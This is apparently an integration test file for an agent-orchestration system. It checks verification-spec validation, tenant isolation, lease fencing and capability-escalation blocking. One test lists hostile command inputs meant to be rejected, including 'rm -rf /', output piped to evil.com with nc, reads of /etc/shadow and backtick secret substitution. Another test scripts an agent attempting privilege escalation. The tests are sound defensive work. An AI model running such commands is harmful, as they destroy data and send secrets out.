/**
 * ADR-0043 Integration Tests: Secure REST Verification Specification Contract
 * and Durable REST-to-Worker Propagation.
 *
 * Verifies end-to-end that:
 * 1. REST/API verification specifications are strictly validated before persistence.
 * 2. Specifications are persisted immutably with contract and bound to (tenantId, contractId, version).
 * 3. The claiming worker receives the authoritative persisted verification specs.
 * 4. System-owned verification stage dispatches allowlisted commands through ToolExecutionGateway and physical provider.
 * 5. Independent completion gate authorizes COMPLETED only upon valid exit code 0 evidence.
 * 6. Metacharacter injection and unallowlisted executables are rejected fail-closed before persistence.
 * 7. Tenant isolation, replay deduplication, and lease fencing remain enforced.
 */

import * as fs from "node:fs";
import * as os from "node:os";
import * as path from "node:path";
import { afterEach, beforeEach, describe, expect, it } from "vitest";
import { SqliteStateStore } from "../../src/adapters/persistence/sqlite-state-store.js";
import { NodeFsWorkspaceAdapter } from "../../src/adapters/workspace/node-fs-workspace-adapter.js";
import { AgentStepController } from "../../src/application/agent-step-controller.js";
import { submitDurableTask } from "../../src/application/durable-submission.js";
import { ProposalValidator } from "../../src/application/proposal-validator.js";
import { RunCoordinator } from "../../src/application/run-coordinator.js";
import { WorkerRuntime } from "../../src/application/worker-runtime.js";
import { staticToolRegistry } from "../../src/domain/tool.js";
import {
  AgentBrainPort,
  AgentBrainRequest,
  AgentBrainResult,
} from "../../src/ports/agent-brain.port.js";
import { SettableClock } from "../../src/ports/clock.port.js";
import {
  ExecutionProvider,
  ExecutionRequest,
  ExecutionResult,
} from "../../src/ports/execution-provider.port.js";
import { CreateTaskRequestSchema } from "../../src/transport/http/api-contracts.js";

class ControllablePhysicalProvider implements ExecutionProvider {
  readonly name = "controllable-physical-provider";
  readonly role = "PHYSICAL" as const;
  readonly tenantModel = "NONE" as const;
  readonly invocations: ExecutionRequest[] = [];
  private handler: (req: ExecutionRequest) => { exitCode: number; stdout?: string; stderr?: string } = () => ({
    exitCode: 0,
    stdout: "OK",
    stderr: "",
  });

  setHandler(handler: (req: ExecutionRequest) => { exitCode: number; stdout?: string; stderr?: string }): void {
    this.handler = handler;
  }

  async execute<TInput = unknown, TOutput = unknown>(
    request: ExecutionRequest<TInput>
  ): Promise<ExecutionResult<TOutput>> {
    this.invocations.push(request);
    const res = this.handler(request);
    return {
      status: "SUCCESS",
      output: {
        exitCode: res.exitCode,
        stdout: res.stdout ?? "",
        stderr: res.stderr ?? "",
        durationMs: 10,
        outputTruncated: false,
      } as unknown as TOutput,
      durationMs: 10,
    };
  }
}

class ScriptedBrain implements AgentBrainPort {
  readonly requests: AgentBrainRequest[] = [];
  private readonly steps: ((req: AgentBrainRequest) => AgentBrainResult)[] = [];

  queue(step: (req: AgentBrainRequest) => AgentBrainResult): this {
    this.steps.push(step);
    return this;
  }

  async proposeAction(request: AgentBrainRequest): Promise<AgentBrainResult> {
    this.requests.push(request);
    const step = this.steps.shift();
    if (step) {
      return step(request);
    }
    return { finishReason: "GOAL_REACHED" };
  }
}

describe("ADR-0043: Secure REST Verification Specification Contract & Propagation", () => {
  const workerId = "worker-adr0043-test";
  let tempDir: string;
  let store: SqliteStateStore;
  let clock: SettableClock;
  let coordinator: RunCoordinator;
  let workspaceAdapter: NodeFsWorkspaceAdapter;
  let brain: ScriptedBrain;
  let provider: ControllablePhysicalProvider;

  beforeEach(() => {
    tempDir = fs.mkdtempSync(path.join(os.tmpdir(), "emerald-adr0043-"));
    store = new SqliteStateStore();
    clock = new SettableClock(new Date("2026-11-10T14:00:00Z"));
    workspaceAdapter = new NodeFsWorkspaceAdapter({ workspaceRoot: tempDir });
    coordinator = new RunCoordinator(store, clock);
    brain = new ScriptedBrain();
    provider = new ControllablePhysicalProvider();

    store.transaction((tx) => {
      tx.insertWorker({
        workerId,
        hostname: "localhost",
        pid: 24680,
        status: "ACTIVE",
        createdAt: clock.nowIso(),
        lastHeartbeatAt: clock.nowIso(),
      });
    });
  });

  afterEach(() => {
    store.close();
    try {
      fs.rmSync(tempDir, { recursive: true, force: true });
    } catch {
      // ignore
    }
  });

  function runtimeWith(p: ExecutionProvider): WorkerRuntime {
    return new WorkerRuntime({
      workerId,
      coordinator,
      clock,
      workspacePort: workspaceAdapter,
      executionProvider: p,
      isIsolationAvailable: true,
    });
  }

  function controllerFor(runtime: WorkerRuntime): AgentStepController {
    return new AgentStepController({
      coordinator,
      stateStore: store,
      workerRuntime: runtime,
      agentBrain: brain,
      proposalValidator: new ProposalValidator({
        coordinator,
        stateStore: store,
        toolRegistry: staticToolRegistry,
        clock,
      }),
      toolRegistry: staticToolRegistry,
      clock,
      enableGovernedVerificationStage: true,
      allowUnverifiedCompletion: false,
    });
  }

  async function provisionWorkspaceFor(taskId: string, runId: string) {
    return await workspaceAdapter.provisionWorkspace({
      workspaceId: `ws-${taskId.slice(0, 8)}`,
      taskId,
      runId,
      maxWorkspaceBytes: 50 * 1024 * 1024,
      maxFileSizeBytes: 10 * 1024 * 1024,
    });
  }

  // --------------------------------------------------------------------------
  // Scenario 1: REST submission with structured argv verification spec
  // --------------------------------------------------------------------------
  it("Scenario 1: REST submission with structured argv verification spec creates durable contract and queued run", () => {
    const rawRequest = {
      title: "Fix bug in solver.js",
      prompt: "Ensure solver outputs 42",
      modelConfig: { modelName: "qwen2.5-coder:1.5b" },
      verificationSpecs: [
        {
          specId: "vspec-solver-test",
          name: "verify-solver",
          argv: ["node", "test-solver.js"],
          timeoutMs: 40000,
          expectedExitCode: 0,
          requireMutation: true,
        },
      ],
    };

    const parsed = CreateTaskRequestSchema.parse(rawRequest);
    const submitted = submitDurableTask(store, coordinator, {
      task: parsed.prompt,
      operation: parsed.title,
      tenantId: "tenant-adr0043-alpha",
      verificationSpecs: parsed.verificationSpecs,
    });

    expect(submitted.taskId).toBeDefined();
    expect(submitted.runId).toBeDefined();
    expect(submitted.status).toBe("QUEUED");

    const contract = store.getContract(`contract-${submitted.taskId}`, 1);
    expect(contract).toBeDefined();
    expect(contract!.spec.verificationSpecs).toHaveLength(1);

    const vSpec = contract!.spec.verificationSpecs[0]!;
    expect(vSpec.specId).toBe("vspec-solver-test");
    expect(vSpec.ruleKind).toBe("EXIT_CODE_ZERO");
    const exp = vSpec.expectedValue as Record<string, unknown>;
    expect(exp.toolName).toBe("run_command");
    expect(exp.argv).toEqual(["node", "test-solver.js"]);
    expect(exp.timeoutMs).toBe(40000);
    expect(exp.requireMutation).toBe(true);
  });

  // --------------------------------------------------------------------------
  // Scenario 2: Canonical hash sensitivity to verification specs
  // --------------------------------------------------------------------------
  it("Scenario 2: MissionContract contentHash changes deterministically when verificationSpecs change", () => {
    const baseRequest = {
      task: "Compute sum",
      operation: "SumOperation",
      tenantId: "tenant-adr0043",
    };

    const task1 = submitDurableTask(store, coordinator, {
      ...baseRequest,
      verificationSpecs: [
        {
          argv: ["node", "check-sum.js"],
        },
      ],
    });

    const task2 = submitDurableTask(store, coordinator, {
      ...baseRequest,
      verificationSpecs: [
        {
          argv: ["python3", "check-sum.py"],
        },
      ],
    });

    const c1 = store.getContract(`contract-${task1.taskId}`, 1)!;
    const c2 = store.getContract(`contract-${task2.taskId}`, 1)!;

    expect(c1.contentHash).not.toEqual(c2.contentHash);
  });

  // --------------------------------------------------------------------------
  // Scenario 3: End-to-end REST submission -> Worker -> System Verification -> Success
  // --------------------------------------------------------------------------
  it("Scenario 3: End-to-end REST submission executes system-owned verification and completes via independent completion gate", async () => {
    let verificationRan = false;
    provider.setHandler((req) => {
      const argv = (req.inputPayload as any)?.argv ?? [];
      if (argv[0] === "node" && argv[1] === "verify-solution.js") {
        verificationRan = true;
        return { exitCode: 0, stdout: "VERIFIED_CORRECT" };
      }
      return { exitCode: 0 };
    });

    const submitted = submitDurableTask(store, coordinator, {
      task: "Create valid solution.js",
      operation: "GenerateSolution",
      tenantId: "tenant-adr0043-success",
      capabilities: ["workspace.file.read", "workspace.file.write", "process.execute", "git.read"],
      verificationSpecs: [
        {
          specId: "vspec-node-verify",
          argv: ["node", "verify-solution.js"],
          timeoutMs: 30000,
          requireMutation: true,
        },
      ],
    });

    const claim = coordinator.claimRun(submitted.runId, workerId, 120000);
    coordinator.startRun(submitted.runId, workerId, claim.lease.leaseId);

    const runtime = runtimeWith(provider);
    const controller = controllerFor(runtime);

    const workspace = await provisionWorkspaceFor(submitted.taskId, submitted.runId);

    // Agent Step 1: Write solution.js
    brain.queue((req) => ({
      finishReason: "ACTION_PROPOSED",
      proposal: {
        proposalId: "p-write-sol",
        toolName: "write_file",
        inputPayload: { path: "solution.js", content: "function solve() { return 42; }\nmodule.exports = { solve };\n" },
        contextSnapshotHash: req.contextSnapshot.contextHash,
        rationale: "write solution",
      },
    }));

    // Agent Step 2: Propose GOAL_REACHED
    brain.queue(() => ({ finishReason: "GOAL_REACHED" }));

    const result = await controller.runStepLoop({
      runId: submitted.runId,
      workerId,
      leaseId: claim.lease.leaseId,
      workspace,
    });

    expect(result.terminalReason).toBe("COMPLETED");
    expect(verificationRan).toBe(true);

    // Verify independent evidence was latched
    const events = store.getEventsForRun(submitted.runId);
    const verifyEvent = events.find((e) => e.eventType === "verification.completed");
    expect(verifyEvent).toBeDefined();
    expect((verifyEvent!.payload as any).status).toBe("VERIFIED");

    // Verify verification action record has SYSTEM_VERIFICATION provenance
    const actions = store.getActionsForRun(submitted.runId);
    const verifyAction = actions.find((a) => a.toolName === "run_command");
    expect(verifyAction).toBeDefined();
    const attempts = store.getAttemptsForAction(verifyAction!.actionId);
    expect(attempts).toHaveLength(1);
    expect(attempts[0]!.status).toBe("SUCCEEDED");
  });

  // --------------------------------------------------------------------------
  // Scenario 4: REST task with failing verification fails closed
  // --------------------------------------------------------------------------
  it("Scenario 4: REST task with failing verification fails closed with UNVERIFIED_COMPLETION_CLAIM", async () => {
    provider.setHandler((req) => {
      const argv = (req.inputPayload as any)?.argv ?? [];
      if (argv[0] === "node" && argv[1] === "verify-solution.js") {
        return { exitCode: 1, stderr: "AssertionError: expected 42 to equal 0" };
      }
      return { exitCode: 0 };
    });

    const submitted = submitDurableTask(store, coordinator, {
      task: "Create valid solution.js",
      operation: "GenerateSolution",
      tenantId: "tenant-adr0043-fail",
      verificationSpecs: [
        {
          specId: "vspec-node-verify",
          argv: ["node", "verify-solution.js"],
          timeoutMs: 30000,
        },
      ],
    });

    const claim = coordinator.claimRun(submitted.runId, workerId, 120000);
    coordinator.startRun(submitted.runId, workerId, claim.lease.leaseId);

    const runtime = runtimeWith(provider);
    const controller = controllerFor(runtime);

    const workspace = await provisionWorkspaceFor(submitted.taskId, submitted.runId);

    // Agent proposes GOAL_REACHED immediately
    brain.queue(() => ({ finishReason: "GOAL_REACHED" }));

    const result = await controller.runStepLoop({
      runId: submitted.runId,
      workerId,
      leaseId: claim.lease.leaseId,
      workspace,
      budget: { maxProposalRejections: 1 },
    });

    // Fails closed because verification failed
    expect(result.terminalReason).not.toBe("COMPLETED");

    // Authoritative verification rejection event recorded
    const events = store.getEventsForRun(submitted.runId);
    const rejectEvent = events.find((e) => e.eventType === "verification.rejected");
    expect(rejectEvent).toBeDefined();
    expect((rejectEvent!.payload as any).status).toBe("COMPLETION_REJECTED");
  });

  // --------------------------------------------------------------------------
  // Scenario 5: Legacy command string parsing and execution
  // --------------------------------------------------------------------------
  it("Scenario 5: Legacy command string is safely tokenized and executed without shell interpreter", async () => {
    let capturedArgv: readonly string[] | undefined;
    provider.setHandler((req) => {
      capturedArgv = (req.inputPayload as any)?.argv;
      return { exitCode: 0, stdout: "PASS" };
    });

    const submitted = submitDurableTask(store, coordinator, {
      task: "Test runner task",
      operation: "RunTests",
      tenantId: "tenant-legacy-cmd",
      capabilities: ["workspace.file.read", "workspace.file.write", "process.execute", "git.read"],
      verificationSpecs: [
        {
          name: "npm-test-runner",
          command: "npm test -- --reporter=json",
          timeoutMs: 25000,
        },
      ],
    });

    const contract = store.getContract(`contract-${submitted.taskId}`, 1)!;
    const vSpec = contract.spec.verificationSpecs[0]!;
    const exp = vSpec.expectedValue as Record<string, unknown>;
    expect(exp.argv).toEqual(["npm", "test", "--", "--reporter=json"]);

    const claim = coordinator.claimRun(submitted.runId, workerId, 120000);
    coordinator.startRun(submitted.runId, workerId, claim.lease.leaseId);

    const runtime = runtimeWith(provider);
    const controller = controllerFor(runtime);
    const workspace = await provisionWorkspaceFor(submitted.taskId, submitted.runId);

    brain.queue(() => ({ finishReason: "GOAL_REACHED" }));

    const result = await controller.runStepLoop({
      runId: submitted.runId,
      workerId,
      leaseId: claim.lease.leaseId,
      workspace,
    });

    expect(result.terminalReason).toBe("COMPLETED");
    expect(capturedArgv).toEqual(["npm", "test", "--", "--reporter=json"]);
  });

  // --------------------------------------------------------------------------
  // Scenario 6: Cross-tenant verification evidence isolation
  // --------------------------------------------------------------------------
  it("Scenario 6: Verification evidence is strictly tenant-isolated and cannot be forged across tenants", async () => {
    const subAlpha = submitDurableTask(store, coordinator, {
      task: "Alpha task",
      operation: "AlphaOp",
      tenantId: "tenant-alpha",
      verificationSpecs: [
        {
          specId: "vspec-isolated",
          argv: ["node", "test-alpha.js"],
        },
      ],
    });

    // Inject verification event belonging to tenant-beta for alpha's run
    store.transaction((tx) => {
      tx.appendEvent({
        eventId: "ev-cross-tenant-forge",
        runId: subAlpha.runId,
        eventType: "verification.completed",
        payload: {
          status: "VERIFIED",
          specId: "vspec-isolated",
          tenantId: "tenant-beta", // DIFFERENT TENANT
        },
        timestamp: clock.nowIso(),
        schemaVersion: 1,
        producer: "attacker",
      });
    });

    const claim = coordinator.claimRun(subAlpha.runId, workerId, 120000);
    coordinator.startRun(subAlpha.runId, workerId, claim.lease.leaseId);

    // Alpha's actual provider produces failure
    provider.setHandler(() => ({ exitCode: 1, stderr: "FAIL" }));

    const runtime = runtimeWith(provider);
    const controller = controllerFor(runtime);
    const workspace = await provisionWorkspaceFor(subAlpha.taskId, subAlpha.runId);

    brain.queue(() => ({ finishReason: "GOAL_REACHED" }));

    const result = await controller.runStepLoop({
      runId: subAlpha.runId,
      workerId,
      leaseId: claim.lease.leaseId,
      workspace,
      budget: { maxProposalRejections: 1 },
    });

    // Cannot complete using forged cross-tenant event
    expect(result.terminalReason).not.toBe("COMPLETED");
  });

  // --------------------------------------------------------------------------
  // Scenario 7: Metacharacter injection, code-eval flags, and prohibited binaries rejected
  // --------------------------------------------------------------------------
  it("Scenario 7: Metacharacters, code-eval flags, path traversal, and prohibited binaries are rejected before contract persistence", () => {
    const maliciousPayloads = [
      { argv: ["node", "test.js; rm -rf /"] },
      { argv: ["bash", "-c", "echo pwned"] },
      { argv: ["sh", "test.sh"] },
      { argv: ["curl", "https://malicious.com/eval"] },
      { argv: ["node", "-e", "process.exit(0)"] },
      { argv: ["node", "--eval", "process.exit(0)"] },
      { argv: ["python3", "-c", "import os; os.system('id')"] },
      { argv: ["node", "../../etc/passwd"] },
      { argv: ["node", "/etc/shadow"] },
      { argv: ["npm", "install", "malicious-pkg"] },
      { command: "node test.js | nc evil.com 1337" },
      { command: "node test.js > /etc/shadow" },
      { command: "pytest `cat secret.txt`" },
      { command: "node -e 'process.exit(0)'" },
    ];

    for (const badSpec of maliciousPayloads) {
      expect(() => {
        CreateTaskRequestSchema.parse({
          title: "Malicious submission",
          prompt: "Exploit attempt",
          modelConfig: { modelName: "qwen2.5-coder:1.5b" },
          verificationSpecs: [badSpec],
        });
      }).toThrow();
    }
  });

  // --------------------------------------------------------------------------
  // Scenario 8: Replay deduplication and identity preservation
  // --------------------------------------------------------------------------
  it("Scenario 8: Replay preserves verification identity and idempotency tokens", async () => {
    provider.setHandler(() => ({ exitCode: 0 }));

    const submitted = submitDurableTask(store, coordinator, {
      task: "Replay verification test",
      operation: "TestReplay",
      tenantId: "tenant-replay",
      capabilities: ["workspace.file.read", "workspace.file.write", "process.execute", "git.read"],
      verificationSpecs: [
        {
          specId: "vspec-replay-test",
          argv: ["node", "test-replay.js"],
        },
      ],
    });

    const claim = coordinator.claimRun(submitted.runId, workerId, 120000);
    coordinator.startRun(submitted.runId, workerId, claim.lease.leaseId);

    const runtime = runtimeWith(provider);
    const controller = controllerFor(runtime);
    const workspace = await provisionWorkspaceFor(submitted.taskId, submitted.runId);

    brain.queue(() => ({ finishReason: "GOAL_REACHED" }));

    await controller.runStepLoop({
      runId: submitted.runId,
      workerId,
      leaseId: claim.lease.leaseId,
      workspace,
    });

    const actions = store.getActionsForRun(submitted.runId);
    const verifyAction = actions.find((a) => a.toolName === "run_command");
    expect(verifyAction).toBeDefined();

    const attempts = store.getAttemptsForAction(verifyAction!.actionId);
    expect(attempts).toHaveLength(1);
    expect(attempts[0]!.idempotencyToken).toBe(`${submitted.runId}:${verifyAction!.actionId}:1`);
  });

  // --------------------------------------------------------------------------
  // Scenario 9: Stale worker attempt is fenced with LEASE_LOST
  // --------------------------------------------------------------------------
  it("Scenario 9: Stale worker attempt on REST-submitted task is fenced with LEASE_LOST", async () => {
    const submitted = submitDurableTask(store, coordinator, {
      task: "Fenced worker test",
      operation: "FencingTest",
      tenantId: "tenant-fencing",
      verificationSpecs: [
        {
          argv: ["node", "test-fencing.js"],
        },
      ],
    });

    const claim = coordinator.claimRun(submitted.runId, workerId, 120000);
    coordinator.startRun(submitted.runId, workerId, claim.lease.leaseId);

    // Register second worker and alter current_worker_id to simulate a stolen/reassigned lease
    store.transaction((tx) => {
      tx.insertWorker({
        workerId: "worker-interloper",
        hostname: "localhost",
        pid: 99999,
        status: "ACTIVE",
        createdAt: clock.nowIso(),
        lastHeartbeatAt: clock.nowIso(),
      });
    });
    (store as any).db.prepare("UPDATE runs SET current_worker_id = 'worker-interloper' WHERE run_id = ?").run(submitted.runId);

    const runtime = runtimeWith(provider);
    const controller = controllerFor(runtime);
    const workspace = await provisionWorkspaceFor(submitted.taskId, submitted.runId);

    brain.queue(() => ({ finishReason: "GOAL_REACHED" }));

    const result = await controller.runStepLoop({
      runId: submitted.runId,
      workerId,
      leaseId: claim.lease.leaseId,
      workspace,
    });

    expect(result.terminalReason).toBe("LEASE_LOST");
    expect(provider.invocations).toHaveLength(0);
  });

  // --------------------------------------------------------------------------
  // Scenario 10: Capability escalation prevention
  // --------------------------------------------------------------------------
  it("Scenario 10: Attaching verificationSpecs does NOT elevate agent capabilities; agent run_command is rejected", async () => {
    provider.setHandler((req) => {
      const argv = (req.inputPayload as any)?.argv ?? [];
      if (argv[0] === "node" && argv[1] === "verify-solution.js") {
        return { exitCode: 0, stdout: "VERIFIED" };
      }
      return { exitCode: 0 };
    });

    // Submit task without "process.execute", but with verificationSpecs
    const submitted = submitDurableTask(store, coordinator, {
      task: "Read-write task only",
      operation: "SafeTask",
      tenantId: "tenant-no-escalation",
      capabilities: ["workspace.file.read", "workspace.file.write"],
      verificationSpecs: [
        {
          specId: "vspec-node-verify",
          argv: ["node", "verify-solution.js"],
        },
      ],
    });

    const contract = store.getContract(`contract-${submitted.taskId}`, 1)!;
    // CRITICAL: process.execute MUST NOT be in allowedCapabilities!
    expect(contract.spec.policy.allowedCapabilities).not.toContain("process.execute");

    const claim = coordinator.claimRun(submitted.runId, workerId, 120000);
    coordinator.startRun(submitted.runId, workerId, claim.lease.leaseId);

    const runtime = runtimeWith(provider);
    const controller = controllerFor(runtime);
    const workspace = await provisionWorkspaceFor(submitted.taskId, submitted.runId);

    // Step 1: Agent tries to escalate capabilities by proposing run_command
    brain.queue((req) => ({
      finishReason: "ACTION_PROPOSED",
      proposal: {
        proposalId: "p-escalate-attempt",
        toolName: "run_command",
        inputPayload: { argv: ["node", "exploit.js"] },
        contextSnapshotHash: req.contextSnapshot.contextHash,
        rationale: "attempt privilege escalation",
      },
    }));

    // Step 2: Agent writes valid file
    brain.queue((req) => ({
      finishReason: "ACTION_PROPOSED",
      proposal: {
        proposalId: "p-write-valid",
        toolName: "write_file",
        inputPayload: { path: "solution.js", content: "console.log('done');" },
        contextSnapshotHash: req.contextSnapshot.contextHash,
        rationale: "write valid file",
      },
    }));

    // Step 3: Agent proposes GOAL_REACHED
    brain.queue(() => ({ finishReason: "GOAL_REACHED" }));

    const result = await controller.runStepLoop({
      runId: submitted.runId,
      workerId,
      leaseId: claim.lease.leaseId,
      workspace,
      budget: { maxProposalRejections: 3 },
    });

    // The run successfully completed after rejecting the unauthorized proposal
    expect(result.terminalReason).toBe("COMPLETED");

    // Verify rejection event was recorded for the unauthorized proposal
    const events = store.getEventsForRun(submitted.runId);
    const rejectEvent = events.find(
      (e) =>
        e.eventType === "proposal.rejected" &&
        (e.payload as any).rejectionReason === "UNAUTHORIZED_CAPABILITY"
    );
    expect(rejectEvent).toBeDefined();

    // Verify provider was never invoked with the agent's exploit attempt
    const exploitInvocation = provider.invocations.find((inv) => {
      const argv = (inv.inputPayload as any)?.argv ?? [];
      return argv[1] === "exploit.js";
    });
    expect(exploitInvocation).toBeUndefined();
  });
});
